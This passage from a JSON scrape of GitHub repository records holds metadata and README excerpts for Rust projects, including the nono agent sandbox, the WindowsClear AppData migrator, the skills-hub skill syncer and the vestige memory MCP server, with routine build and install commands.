text.\n\nThe left padding is increased to 76 tokens, which maps to exactly 38 decoder tokens of silence and covers the full streaming prefix. See [`src/audio/pad.rs`](src/audio/pad.rs) for details.\n\n### WASM Constraints Solved\n\nRunning a 4B model in a browser tab required solving five hard constraints:\n\n1. **2 GB allocation limit** ‚Äî `ShardedCursor` reads across multiple `Vec<u8>` buffers\n2. **4 GB address space** ‚Äî Two-phase loading: parse weights, drop reader, then finalize\n3. **1.5 GiB embedding table** ‚Äî Q4 embeddings on GPU + CPU-side row lookups\n4. **No sync GPU readback** ‚Äî All tensor reads use `into_data_async().await`\n5. **256 workgroup invocation limit** ‚Äî Patched cubecl-wgpu to cap reduce kernel workgroups\n\n## Building\n\n```bash\n# Native (default features: wgpu + native-tokenizer)\ncargo build --release\n\n# With all features\ncargo build --release --features \"wgpu,cli,hub\"\n\n# WASM\n",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:26.932985"
  },
  {
    "basic_info": {
      "name": "nono",
      "full_name": "always-further/nono",
      "owner": "always-further",
      "description": "Secure, kernel-enforced sandbox CLI and SDKs for AI agents, MCP and LLM workloads. Capability-based isolation with secure key management, atomic rollback, cryptographic immutable audit chain of provenance. Run your agents in a zero-trust environment.",
      "url": "https://github.com/always-further/nono",
      "clone_url": "https://github.com/always-further/nono.git",
      "ssh_url": "git@github.com:always-further/nono.git",
      "homepage": "https://docs.nono.sh",
      "created_at": "2026-01-31T09:25:45Z",
      "updated_at": "2026-02-20T02:27:21Z",
      "pushed_at": "2026-02-19T21:33:55Z"
    },
    "stats": {
      "stars": 476,
      "forks": 30,
      "watchers": 476,
      "open_issues": 18,
      "size": 14831
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 779166,
        "Shell": 82199,
        "C": 16772,
        "Makefile": 2944
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "agentic-ai",
        "ai-agent-security",
        "ai-agents",
        "ai-security",
        "code-execution",
        "cybersecurity",
        "isolation",
        "linux-security",
        "llm",
        "mcp",
        "open-source",
        "prompt-injection",
        "runtime-security",
        "sandbox",
        "security",
        "sigstore",
        "supply-chain-security",
        "zero-trust"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<img src=\"assets/nono-logo.png\" alt=\"nono logo\" width=\"600\"/>\n\n**AI agent security that makes the dangerous bits structurally impossible.**\n\n<p>\n  From the creator of\n  <a href=\"https://sigstore.dev\"><strong>Sigstore</strong></a>\n  <br/>\n  <sub>The standard for secure software attestation, used by PyPI, npm, brew, and Maven Central</sub>\n</p>\n<p>\n  <a href=\"https://opensource.org/licenses/Apache-2.0\"><img src=\"https://img.shields.io/badge/License-Apache%202.0-blue.svg\" alt=\"License\"/></a>\n  <a href=\"https://github.com/always-further/nono/actions/workflows/ci.yml\"><img src=\"https://github.com/always-further/nono/actions/workflows/ci.yml/badge.svg\" alt=\"CI Status\"/></a>\n  <a href=\"https://docs.nono.sh\"><img src=\"https://img.shields.io/badge/Docs-docs.nono.sh-green.svg\" alt=\"Documentation\"/></a>\n</p>\n<p>\n  <a href=\"https://discord.gg/pPcjYzGvbS\">\n    <img src=\"https://img.shields.io/badge/Chat-Join%20Discord-7289da?style=for-the-badge&logo=discord&logoColor=white\" alt=\"Join Discord\"/>\n  </a>\n</p>\n\n</div>\n\n> [!WARNING]\n> This is an early alpha release that has not undergone comprehensive security audits. While we have taken care to implement robust security measures, there may still be undiscovered issues. We do not recommend using this in production until we release a stable version of 1.0.\n\n> [!NOTE]\n> We are just wrapping up the separation of the CLI and core library. The last stable CLI release is still available on homebrew tap (version v0.5.0) and is fine to use. We will update this README with installation instructions when all library clients are ready. We plan to submit to homebrew-core, but the repo is not yet 30 days old.\n\nAI agents get filesystem access, run shell commands, and are inherently open to prompt injection. The standard response is guardrails and policies. The problem is that policies can be bypassed and guardrails linguistically overcome.\n\nKernel-enforced sandboxing (Landlock/Seatbelt) blocks unauthorized access at the syscall level. Every filesystem change gets a rollback snapshot with integrity protection. Destructive commands are denied before they run. Secrets are injected without touching disk. When the agent needs access outside its permissions, a kernel-mediated supervisor intercepts the syscall via seccomp BPF, opens the file after user approval, and injects only the file descriptor ‚Äî the agent never executes its own `open()`. No root or `CAP_SYS_ADMIN` required. Runs on any Linux kernel 5.13+ ‚Äî bare metal, containers(Docker,Podman,K8s), Firecracker, Kata.\n\n> *\"nono, so secure, Chuck Norris tried to break out, but gave up and went home.\"* ‚Äî Chuck Norris (allegedly)\n\n> \n## CLI\n\nThe CLI builds on the library to provide a ready-to-use sandboxing tool, popular with coding-agents, with built-in profiles, policy groups, and interactive UX.\n\n```bash\n# Claude Code with inbuilt profile\nnono run --profile claude-code -- claude\n# OpenCode with custom permissions\nnono run --profile opencode --allow-cwd/src --allow-cwd/output -- opencode\n# OpenClaw with custom permissions\nnono run --profile openclaw --allow-cwd -- openclaw gateway\n# Any command with custom permissions\nnono run --read ./src --write ./output -- cargo build\n```\n\n## Library (Coming very Soon!)\n\nThe core is a Rust library that can be embedded into any application via native bindings. The library is a policy-free sandbox primitive -- it applies only what clients explicitly request.\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/rust/rust-original.svg\" width=\"18\" height=\"18\" alt=\"Rust\"/> Rust ‚Äî [crates.io](https://crates.io/crates/nono)\n\n```rust\nuse nono::{CapabilitySet, Sandbox};\n\nlet mut caps = CapabilitySet::new();\ncaps.allow_read(\"/data/models\")?;\ncaps.allow_write(\"/tmp/workspace\")?;\n\nSandbox::apply(&caps)?;  // Irreversible ‚Äî kernel-enforced from here on\n```\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg\" width=\"18\" height=\"18\" alt=\"Python\"/> Python ‚Äî [nono-py](https://github.com/always-further/nono-py)\n\n```python\nfrom nono_py import CapabilitySet, AccessMode, apply\n\ncaps = CapabilitySet()\ncaps.allow_path(\"/data/models\", AccessMode.READ)\ncaps.allow_path(\"/tmp/workspace\", AccessMode.READ_WRITE)\n\napply(caps)  # Apply CapabilitySet\n```\n\n#### <img src=\"https://cdn.jsdelivr.net/gh/devicons/devicon/icons/typescript/typescript-original.svg\" width=\"18\" height=\"18\" alt=\"TypeScript\"/> TypeScript ‚Äî [nono-ts](https://github.com/always-further/nono-ts)\n\n```typescript\nimport { CapabilitySet, AccessMode, apply } from \"nono-ts\";\n\nconst caps = new CapabilitySet();\ncaps.allowPath(\"/data/models\", AccessMode.Read);\ncaps.allowPath(\"/tmp/workspace\", AccessMode.ReadWrite);\n\napply(caps);  // Irreversible ‚Äî kernel-enforced from here on\n```\n\n## Features\n\n### Kernel-Enforced Sandbox\n\nnono applies OS-level restrictions that cannot be bypassed or escalated from within the sandboxed process. Permissions are defined as capabilities granted before execution -- once the sa",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:28.127042"
  },
  {
    "basic_info": {
      "name": "WindowsClear",
      "full_name": "tanaer/WindowsClear",
      "owner": "tanaer",
      "description": "Windows CÁõòÊ∏ÖÁêÜÂ∑•ÂÖ∑/CÁõòÁò¶Ë∫´Â∑•ÂÖ∑ÔºåËøò‰Ω†AppdataÁöÑÂ§ßÈáèÁ°¨ÁõòÁ©∫Èó¥ | Windows System disk cleanup, returning a large amount of hard drive space from your Appdata",
      "url": "https://github.com/tanaer/WindowsClear",
      "clone_url": "https://github.com/tanaer/WindowsClear.git",
      "ssh_url": "git@github.com:tanaer/WindowsClear.git",
      "homepage": "",
      "created_at": "2026-01-24T09:12:25Z",
      "updated_at": "2026-02-19T16:59:20Z",
      "pushed_at": "2026-01-29T16:40:36Z"
    },
    "stats": {
      "stars": 429,
      "forks": 15,
      "watchers": 429,
      "open_issues": 3,
      "size": 465
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 92583
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# WindowsClear (ÊÑöÂÖ¨ÁßªÁõò)\n<img width=\"791\" height=\"487\" alt=\"img1\" src=\"https://github.com/user-attachments/assets/6c10a5cd-d111-44a2-b355-dba91108de88\" />\n\n<p align=\"center\">\n   \n<p align=\"center\">\n  [<a href=\"https://github.com/tanaer/WindowsClear/releases\">Á´ãÂç≥‰ΩìÈ™å</a>] [<a href=\"./docs/README_EN.md\">English</a>]\n</p>\n<p align=\"center\">\n  <a href=\"https://t.me/TgTechMsgBot\" target=\"_blank\">\n    <img alt=\"Telegram\" src=\"https://img.shields.io/badge/Telegram-%235AA9E6?logo=telegram&labelColor=FFFFFF\" />\n  </a>\n  <a href=\"https://deepwiki.com/tanaer/WindowsClear\" target=\"_blank\">\n    <img alt=\"DeepWiki\" src=\"https://deepwiki.com/badge.svg\" />\n  </a>\n  <br>\n  <img alt=\"GitHub commits since latest release\" src=\"https://img.shields.io/github/commits-since/tanaer/WindowsClear/latest\">\n  <a href=\"https://github.com/tanaer/WindowsClear/releases\" target=\"_blank\">\n    <img alt=\"GitHub Release\" src=\"https://img.shields.io/github/v/release/tanaer/WindowsClear\">\n  </a>\n</p>\n\n\n## ÁÆÄ‰ªã\n\nÂΩì C ÁõòÁ©∫Èó¥‰∏çË∂≥„ÄÅCÁõòÊª°‰∫ÜÊÄé‰πàÂäûÔºüWindowsClear ÊòØ‰∏ÄÊ¨æÈù¢Âêë Windows Á≥ªÁªüÁõòÁöÑ **CÁõòÊ∏ÖÁêÜÂ∑•ÂÖ∑** / **cÁõòÊ∏ÖÁêÜËΩØ‰ª∂**Ôºå‰∏ìÊ≥®‰∫éÈáäÊîæ `AppData` ÁõÆÂΩïÂç†Áî®ÁöÑÂ∑®ÈáèÁ©∫Èó¥„ÄÇÂÆÉËÉΩÊâ´ÊèèÂá∫Âç†Áî®Á©∫Èó¥Â§ßÁöÑËΩØ‰ª∂Êï∞ÊçÆÊñá‰ª∂Â§πÔºå‰∏ÄÈîÆËøÅÁßªÂà∞ÂÖ∂‰ªñÁ£ÅÁõòÔºàÂ¶Ç D ÁõòÔºâÔºåÂπ∂Ëá™Âä®ÂàõÂª∫ÁõÆÂΩïËÅîÊé•ÔºåÁ°Æ‰øùËΩØ‰ª∂Êó†ÁºùËøêË°åÔºåÂ∞±ÂÉè‰ªéÊú™ÁßªÂä®Ëøá‰∏ÄÊ†∑ÔºåÂ∏ÆÂä©ÂÆûÁé∞ **cÁõòÁò¶Ë∫´**ÔºåÁºìËß£ **CÁõòÁ©∫Èó¥‰∏çË∂≥**„ÄÇ\n\n## ÈÄÇÁî®Âú∫ÊôØÔºàCÁõòÊª°‰∫ÜÊÄé‰πàÂäûÔºâ\n\n*   CÁõòÁ©∫Èó¥‰∏çË∂≥ÊàñÊèêÁ§∫ CÁõòÊª°‰∫ÜÔºåÈúÄË¶ÅÂø´ÈÄüÈáäÊîæÁ©∫Èó¥\n*   ÊÉ≥ÊâæÂèØÈù†ÁöÑ CÁõòÊ∏ÖÁêÜÂ∑•ÂÖ∑ / cÁõòÊ∏ÖÁêÜËΩØ‰ª∂ÔºåÈÅøÂÖçËØØÂà†Á≥ªÁªüÊñá‰ª∂\n*   Â∏åÊúõËøõË°å cÁõòÁò¶Ë∫´ Êàñ‚ÄúÁ±ª cÁõòÊâ©ÂÆπ‚ÄùÁöÑÁ©∫Èó¥ËÖæÊå™Ôºå‰∏çÊîπÂàÜÂå∫‰πüËÉΩÈáäÊîæÁ©∫Èó¥\n*   ÈúÄË¶ÅÊ∏ÖÁêÜ AppData Â§ßÊñá‰ª∂Â§πÔºåËß£ÂÜ≥ËΩØ‰ª∂ÁºìÂ≠ò/Êï∞ÊçÆÂç†Áî®ËøáÂ§ß\n\n## Ê†∏ÂøÉÂäüËÉΩ\n\n*   **Êô∫ËÉΩÊâ´Êèè**: Ëá™Âä®ÂàÜÊûê `%LOCALAPPDATA%` Âíå `%APPDATA%`ÔºåÂø´ÈÄüÂÆö‰ΩçÂç†Áî®Ë∂ÖËøá 10% Á©∫Èó¥ÁöÑ‚ÄúÂ§ßÊà∑‚ÄùÔºåÊõ¥È´òÊïàËøõË°å CÁõòÊ∏ÖÁêÜ„ÄÇ\n*   **Êó†ÁºùËøÅÁßª**: Ë∑®ÁõòÁßªÂä®Êñá‰ª∂ÂêéÔºåËá™Âä®Âú®Âéü‰ΩçÂàõÂª∫ Junction ÈìæÊé•ÔºåËΩØ‰ª∂Êó†ÈúÄÈáçÊñ∞ÈÖçÁΩÆ„ÄÇ\n*   **ÂÆâÂÖ®ÂèØÈù†**:\n    *   **Âç†Áî®Ê∏ÖÁêÜ**: Ëá™Âä®Ê£ÄÊµãÊñá‰ª∂Âç†Áî®ÔºåÊîØÊåÅËá™Âä®ÁªìÊùüÁõ∏ÂÖ≥ËøõÁ®ãÔºà‰ΩøÁî® Windows Restart Manager ÊäÄÊúØÔºâÔºåÈùûÂ∫ïÂ±ÇÂÆûÁé∞ÔºåÊúâ‰∫õ‰∏ç‰∏ÄÂÆöÂèØ‰ª•Ê∏ÖÁêÜÔºå‰ΩÜÂü∫Êú¨‰∏çÂΩ±ÂìçÁ©∫Èó¥ÈáäÊîæÊïàÊûú„ÄÇ\n    *   **Â§±Ë¥•ÂõûÊªö**: ËøÅÁßªËøáÁ®ã‰∏≠Ëã•ÂèëÁîüÈîôËØØÔºåËá™Âä®Â∞ùËØïÊÅ¢Â§çÔºå‰øùÈöúÊï∞ÊçÆÂÆâÂÖ®„ÄÇ\n*   **‰∫∫ÊÄßÂåñ‰ΩìÈ™å**:\n    *   **ÊûÅÈÄüÊÄßËÉΩ**: Âü∫‰∫é Rust ÂºÄÂèëÔºåÂ§öÁ∫øÁ®ãÂπ∂Ë°åÊâ´ÊèèÔºåÈÄüÂ∫¶È£ûÂø´„ÄÇ\n    *   **Êô∫ËÉΩÁºìÂ≠ò**: ‰∫åÊ¨°Êâ´ÊèèÊó†ÂèòÂä®Êó∂ÁßíÂá∫ÁªìÊûú„ÄÇ\n    *   **ÂèØËßÜÂåñËøõÂ∫¶**: Á≤æÁ°ÆÂà∞Â≠óËäÇÁöÑËøõÂ∫¶Êù°ÔºåÂÆûÊó∂ÊòæÁ§∫‰º†ËæìÈÄüÂ∫¶ÂíåÂâ©‰ΩôÊó∂Èó¥È¢Ñ‰º∞„ÄÇ\n    *   **‰∏≠Ëã±ÂèåËØ≠**: ÁïåÈù¢ÊîØÊåÅ‰∏≠Ëã±Êñá‰∏ÄÈîÆÂàáÊç¢„ÄÇ\n    *   **ÊöÇÂÅú/ÁªßÁª≠**: Â§ßÊñá‰ª∂‰º†ËæìËøáÁ®ã‰∏≠ÂèØÈöèÊó∂ÊöÇÂÅú„ÄÇ\n\n## ‰ΩøÁî®ÊñπÊ≥ï\n\n1.  **‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩËøêË°å** `WindowsClear.exe` „ÄÇ\n2.  ÁÇπÂáª **‚ÄúÊâ´ÊèèÂ§ßÊñá‰ª∂Â§π‚Äù**„ÄÇ\n3.  Âú®ÂàóË°®‰∏≠ÂãæÈÄâ‰Ω†ÊÉ≥Ë¶ÅËøÅÁßªÁöÑËΩØ‰ª∂ÔºàÂª∫ËÆÆÂÖà‰ªé‰∏çÈáçË¶ÅÁöÑËΩØ‰ª∂ÂºÄÂßãÂ∞ùËØïÔºâ„ÄÇ\n4.  ÈÄâÊã© **ÁõÆÊ†áÊ†πÁõÆÂΩï**Ôºà‰æãÂ¶Ç `D:\\AppData`Ôºâ„ÄÇ\n5.  ÁÇπÂáª **‚ÄúÊâßË°åËøÅÁßª‚Äù**ÔºåÁ≠âÂæÖÂÆåÊàêÂç≥ÂèØ„ÄÇ\n\n## Â∏∏ËßÅÈóÆÈ¢ò\n\n*   **CÁõòÂì™‰∫õÊñá‰ª∂ÂèØ‰ª•Âà†Èô§Ôºü**\n    *   WindowsClear ‰∏çÂª∫ËÆÆÁõ¥Êé•Âà†Èô§Á≥ªÁªüÊñá‰ª∂ÔºåËÄåÊòØÈÄöËøáËøÅÁßª AppData ËææÂà∞ cÁõòÁò¶Ë∫´„ÄÇËã•ÈúÄË¶ÅÂà†Èô§ÂÜÖÂÆπÔºåÂª∫ËÆÆ‰ºòÂÖà‰ΩøÁî®Á≥ªÁªüËá™Â∏¶‚ÄúÂ≠òÂÇ®ÊÑüÁü•/Á£ÅÁõòÊ∏ÖÁêÜ‚ÄùÔºåÈáçÁÇπÊ∏ÖÁêÜ‰∏¥Êó∂Êñá‰ª∂Ôºà`%TEMP%`Ôºâ„ÄÅÂõûÊî∂Á´ô„ÄÅÊõ¥Êñ∞ÁºìÂ≠òÁ≠âÔºåÈÅøÂÖçÂà†Èô§ `Windows`„ÄÅ`Program Files` Á≠âÁ≥ªÁªüÁõÆÂΩï„ÄÇ\n*   **‰∏∫‰ªÄ‰πàË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôêÔºü**\n    *   ÂàõÂª∫ÁõÆÂΩïËÅîÊé•Ôºàmklink /JÔºâÂíåÊü•ËØ¢/ÁªìÊùüÂÖ∂‰ªñËøõÁ®ãÈÄöÂ∏∏ÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôê„ÄÇ\n*   **ËøÅÁßªÂêéËΩØ‰ª∂ËøòËÉΩÊâìÂºÄÂêóÔºü**\n    *   ÊòØÁöÑ„ÄÇWindows ÁöÑÁõÆÂΩïËÅîÊé•ÂØπÂ∫îÁî®Á®ãÂ∫èÊòØÈÄèÊòéÁöÑÔºåËΩØ‰ª∂‰ºöËÆ§‰∏∫Êñá‰ª∂‰ªçÁÑ∂Âú® C Áõò„ÄÇ\n*   **Â¶Ç‰ΩïÊÅ¢Â§çÔºü**\n    *   Âè™ÈúÄÂà†Èô§ C ÁõòÁöÑÂø´Êç∑ÊñπÂºèÔºàÂ∏¶ÁÆ≠Â§¥ÂõæÊ†áÁöÑÊñá‰ª∂Â§πÔºâÔºåÁÑ∂ÂêéÊää D ÁõòÁöÑÊñá‰ª∂Ââ™ÂàáÂõû C ÁõòÂéü‰ΩçÂç≥ÂèØ„ÄÇ\n*   **cÁõòÊâ©ÂÆπ‰∏ÄÂÆöË¶ÅÊîπÂàÜÂå∫ÂêóÔºü**\n    *   cÁõòÊâ©ÂÆπÈÄöÂ∏∏Ê∂âÂèäÂàÜÂå∫Ë∞ÉÊï¥„ÄÇWindowsClear Êèê‰æõ‰∏çÊîπÂàÜÂå∫ÁöÑÊõø‰ª£ÊñπÊ°àÔºåÈÄöËøáËøÅÁßª AppData Êù•ÈáäÊîæ C ÁõòÁ©∫Èó¥„ÄÇ\n\n## ÊûÑÂª∫ÊåáÂçó\n\nÊú¨È°πÁõÆ‰ΩøÁî® Rust ÂºÄÂèë„ÄÇ\n\n```bash\n# ÂÖãÈöÜ‰ªìÂ∫ì\ngit clone https://github.com/tanaer/WindowsClear.git\ncd WindowsClear\n\n# ÁºñËØë Release ÁâàÊú¨\ncargo build --release\n```\n\n## ÊâìËµè\n\n### Áà±ÂèëÁîµ\n\nhttps://afdian.com/a/anyone168\n\n### USDT-TRC20\n\n`TREQQPsEVBMH6SqboRoVYh5Hk7fMSCGkAx`\n\n### USDT-BEP20\n\n`0xa37B47Ec4a6Ed783d39690c49CB1228C44068192`\n\n## License\n\nMIT License\n\n## üöÄ Activity\n\n[![Star History Chart](https://api.star-history.com/svg?repos=tanaer/WindowsClear&type=date&legend=top-left)](https://www.star-history.com/#tanaer/WindowsClear&type=date&legend=top-left)\n\n## License\nMIT License\n",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:29.298256"
  },
  {
    "basic_info": {
      "name": "skills-hub",
      "full_name": "qufei1993/skills-hub",
      "owner": "qufei1993",
      "description": "A cross-platform desktop app to manage Agent Skills in one place and sync them to multiple AI coding tools‚Äô global skills directories ‚Äî ‚ÄúInstall once, sync everywhere‚Äù.",
      "url": "https://github.com/qufei1993/skills-hub",
      "clone_url": "https://github.com/qufei1993/skills-hub.git",
      "ssh_url": "git@github.com:qufei1993/skills-hub.git",
      "homepage": "",
      "created_at": "2026-01-25T03:31:21Z",
      "updated_at": "2026-02-19T04:47:10Z",
      "pushed_at": "2026-02-01T12:15:08Z"
    },
    "stats": {
      "stars": 391,
      "forks": 45,
      "watchers": 391,
      "open_issues": 11,
      "size": 2394
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 161658,
        "TypeScript": 124625,
        "CSS": 29735,
        "JavaScript": 10297,
        "HTML": 366,
        "Shell": 202
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# Skills Hub (Tauri Desktop)\n\nA cross-platform desktop app (Tauri + React) to manage Agent Skills in one place and sync them to multiple AI coding tools‚Äô global skills directories (prefer symlink/junction, fallback to copy) ‚Äî ‚ÄúInstall once, sync everywhere‚Äù.\n\n## Documentation\n\n- English (default): `README.md` (this file)\n- ‰∏≠ÊñáÔºö[`docs/README.zh.md`](docs/README.zh.md)\n\nDesign docs:\n\n- System design (EN): [`docs/system-design.md`](docs/system-design.md)\n- Á≥ªÁªüËÆæËÆ°Ôºà‰∏≠ÊñáÔºâÔºö[`docs/system-design.zh.md`](docs/system-design.zh.md)\n\n## Key Features\n\n- Unified view: managed skills and per-tool activation status\n- Onboarding migration: scan existing skills in installed tools, import into the Central Repo, and sync\n- Import sources: local folder / Git URL (including multi-skill repo selection)\n- Update: refresh from source; propagate updates to copy-mode targets\n- New tool detection: detect newly installed tools and prompt to sync managed skills\n\n![Skills Hub](docs/assets/home-example.png)\n\n## Supported AI Coding Tools\n\n| tool key | Display name | skills dir (relative to `~`) | detect dir (relative to `~`) |\n| --- | --- | --- | --- |\n| `cursor` | Cursor | `.cursor/skills` | `.cursor` |\n| `claude_code` | Claude Code | `.claude/skills` | `.claude` |\n| `codex` | Codex | `.codex/skills` | `.codex` |\n| `opencode` | OpenCode | `.config/opencode/skills` | `.config/opencode` |\n| `antigravity` | Antigravity | `.gemini/antigravity/global_skills` | `.gemini/antigravity` |\n| `amp` | Amp | `.config/agents/skills` | `.config/agents` |\n| `kimi_cli` | Kimi Code CLI | `.config/agents/skills` | `.config/agents` |\n| `augment` | Augment | `.augment/rules` | `.augment` |\n| `openclaw` | OpenClaw | `.moltbot/skills` | `.moltbot` |\n| `cline` | Cline | `.cline/skills` | `.cline` |\n| `codebuddy` | CodeBuddy | `.codebuddy/skills` | `.codebuddy` |\n| `command_code` | Command Code | `.commandcode/skills` | `.commandcode` |\n| `continue` | Continue | `.continue/skills` | `.continue` |\n| `crush` | Crush | `.config/crush/skills` | `.config/crush` |\n| `junie` | Junie | `.junie/skills` | `.junie` |\n| `iflow_cli` | iFlow CLI | `.iflow/skills` | `.iflow` |\n| `kiro_cli` | Kiro CLI | `.kiro/skills` | `.kiro` |\n| `kode` | Kode | `.kode/skills` | `.kode` |\n| `mcpjam` | MCPJam | `.mcpjam/skills` | `.mcpjam` |\n| `mistral_vibe` | Mistral Vibe | `.vibe/skills` | `.vibe` |\n| `mux` | Mux | `.mux/skills` | `.mux` |\n| `openclaude` | OpenClaude IDE | `.openclaude/skills` | `.openclaude` |\n| `openhands` | OpenHands | `.openhands/skills` | `.openhands` |\n| `pi` | Pi | `.pi/agent/skills` | `.pi` |\n| `qoder` | Qoder | `.qoder/skills` | `.qoder` |\n| `qwen_code` | Qwen Code | `.qwen/skills` | `.qwen` |\n| `trae` | Trae | `.trae/skills` | `.trae` |\n| `trae_cn` | Trae CN | `.trae-cn/skills` | `.trae-cn` |\n| `zencoder` | Zencoder | `.zencoder/skills` | `.zencoder` |\n| `neovate` | Neovate | `.neovate/skills` | `.neovate` |\n| `pochi` | Pochi | `.pochi/skills` | `.pochi` |\n| `adal` | AdaL | `.adal/skills` | `.adal` |\n| `kilo_code` | Kilo Code | `.kilocode/skills` | `.kilocode` |\n| `roo_code` | Roo Code | `.roo/skills` | `.roo` |\n| `goose` | Goose | `.config/goose/skills` | `.config/goose` |\n| `gemini_cli` | Gemini CLI | `.gemini/skills` | `.gemini` |\n| `github_copilot` | GitHub Copilot | `.copilot/skills` | `.copilot` |\n| `clawdbot` | Clawdbot | `.clawdbot/skills` | `.clawdbot` |\n| `droid` | Droid | `.factory/skills` | `.factory` |\n| `windsurf` | Windsurf | `.codeium/windsurf/skills` | `.codeium/windsurf` |\n\n## Development\n\n### Prerequisites\n\n- Node.js 18+ (recommended: 20+)\n- Rust (stable)\n- Tauri system dependencies (follow Tauri official docs for your OS)\n\n```bash\nnpm install\nnpm run tauri:dev\n```\n\n### Build\n\n```bash\nnpm run lint\nnpm run build\nnpm run tauri:build\n```\n\n#### Platform build commands (from `package.json`)\n\n- macOS (dmg): `npm run tauri:build:mac:dmg`\n- macOS (universal dmg): `npm run tauri:build:mac:universal:dmg`\n- Windows (MSI): `npm run tauri:build:win:msi`\n- Windows (NSIS exe): `npm run tauri:build:win:exe`\n- Windows (MSI+NSIS): `npm run tauri:build:win:all`\n- Linux (deb): `npm run tauri:build:linux:deb`\n- Linux (AppImage): `npm run tauri:build:linux:appimage`\n- Linux (deb+AppImage): `npm run tauri:build:linux:all`\n\n### Tests (Rust)\n\n```bash\ncd src-tauri\ncargo test\n```\n\n## Contributing & Security\n\n- Contributing: [`CONTRIBUTING.md`](CONTRIBUTING.md)\n- Code of Conduct: [`CODE_OF_CONDUCT.md`](CODE_OF_CONDUCT.md)\n- Security: [`SECURITY.md`](SECURITY.md)\n\n## FAQ / Notes\n\n- Where are skills stored? The Central Repo defaults to `~/.skillshub` (configurable in Settings).\n- Why is Cursor sync always copy? Cursor currently does not support symlink/junction-based skill directories, so Skills Hub forces directory copy when syncing to Cursor.\n- Why does sync sometimes fall back to copy? Skills Hub prefers symlink/junction, but on some systems (especially Windows) symlinks may be restricted; in that case it falls back to directory copy.\n- What does `TARGET_EXISTS|...` mean? The targ",
      "default_branch": "main"
    },
    "fetched_at": "2026-02-20T03:28:30.471270"
  },
  {
    "basic_info": {
      "name": "vestige",
      "full_name": "samvallad33/vestige",
      "owner": "samvallad33",
      "description": "Cognitive memory MCP server for Claude - FSRS-6, spreading activation, synaptic tagging, and 130 years of memory research",
      "url": "https://github.com/samvallad33/vestige",
      "clone_url": "https://github.com/samvallad33/vestige.git",
      "ssh_url": "git@github.com:samvallad33/vestige.git",
      "homepage": null,
      "created_at": "2026-01-25T07:31:09Z",
      "updated_at": "2026-02-19T22:28:42Z",
      "pushed_at": "2026-02-19T09:05:40Z"
    },
    "stats": {
      "stars": 374,
      "forks": 31,
      "watchers": 374,
      "open_issues": 1,
      "size": 1530
    },
    "tech_info": {
      "language": "Rust",
      "languages": {
        "Rust": 2231023,
        "HTML": 44978,
        "JavaScript": 18054,
        "Shell": 6088
      },
      "license": "GNU Affero General Public License v3.0",
      "topics": []
    },
    "content": {
      "readme": "# Vestige\n\n**The open-source cognitive engine for AI.**\n\n[![GitHub stars](https://img.shields.io/github/stars/samvallad33/vestige?style=social)](https://github.com/samvallad33/vestige)\n[![Release](https://img.shields.io/github/v/release/samvallad33/vestige)](https://github.com/samvallad33/vestige/releases/latest)\n[![License](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE)\n[![MCP Compatible](https://img.shields.io/badge/MCP-compatible-green)](https://modelcontextprotocol.io)\n\n> Your AI forgets everything between sessions. Vestige fixes that. Built on 130 years of memory research ‚Äî FSRS-6 spaced repetition, prediction error gating, synaptic tagging ‚Äî all running in a single Rust binary, 100% local.\n\n### What's New in v1.6.0\n\n- **6x vector storage reduction** ‚Äî F16 quantization + Matryoshka 256-dim truncation\n- **Neural reranking** ‚Äî Jina cross-encoder reranker for ~20% better retrieval\n- **Instant startup** ‚Äî cross-encoder loads in background, zero blocking\n- **Auto-migration** ‚Äî old 768-dim embeddings seamlessly upgraded\n\nSee [CHANGELOG](CHANGELOG.md) for full version history.\n\n---\n\n## Give Your AI a Brain in 30 Seconds\n\n```bash\n# 1. Install\ncurl -L https://github.com/samvallad33/vestige/releases/latest/download/vestige-mcp-aarch64-apple-darwin.tar.gz | tar -xz\nsudo mv vestige-mcp vestige vestige-restore /usr/local/bin/\n\n# 2. Connect\nclaude mcp add vestige vestige-mcp -s user\n\n# 3. Test\n# \"Remember that I prefer TypeScript over JavaScript\"\n# New session ‚Üí \"What are my coding preferences?\"\n# It remembers.\n```\n\n<details>\n<summary>Other platforms & install methods</summary>\n\n**macOS (Intel):**\n```bash\ncurl -L https://github.com/samvallad33/vestige/releases/latest/download/vestige-mcp-x86_64-apple-darwin.tar.gz | tar -xz\nsudo mv vestige-mcp vestige vestige-restore /usr/local/bin/\n```\n\n**Linux:**\n```bash\ncurl -L https://github.com/samvallad33/vestige/releases/latest/download/vestige-mcp-x86_64-unknown-linux-gnu.tar.gz | tar -xz\nsudo mv vestige-mcp vestige vestige-restore /usr/local/bin/\n```\n\n**Windows:** Download from [Releases](https://github.com/samvallad33/vestige/releases/latest)\n\n**Build from source:**\n```bash\ngit clone https://github.com/samvallad33/vestige && cd vestige\ncargo build --release\nsudo cp target/release/{vestige-mcp,vestige,vestige-restore} /usr/local/bin/\n```\n\n**npm:**\n```bash\nnpm install -g vestige-mcp\n```\n</details>\n\n---\n\n## Works Everywhere\n\nVestige speaks MCP ‚Äî the universal protocol for AI tools. One brain, every IDE.\n\n| IDE | Setup |\n|-----|-------|\n| **Claude Code** | `claude mcp add vestige vestige-mcp -s user` |\n| **Claude Desktop** | [2-min setup](docs/CONFIGURATION.md#claude-desktop-macos) |\n| **Xcode 26.3** | [Integration guide](docs/integrations/xcode.md) |\n| **Cursor** | [Integration guide](docs/integrations/cursor.md) |\n| **VS Code (Copilot)** | [Integration guide](docs/integrations/vscode.md) |\n| **JetBrains** | [Integration guide](docs/integrations/jetbrains.md) |\n| **Windsurf** | [Integration guide](docs/integrations/windsurf.md) |\n\nFix a bug in VS Code. Open Xcode. Your AI 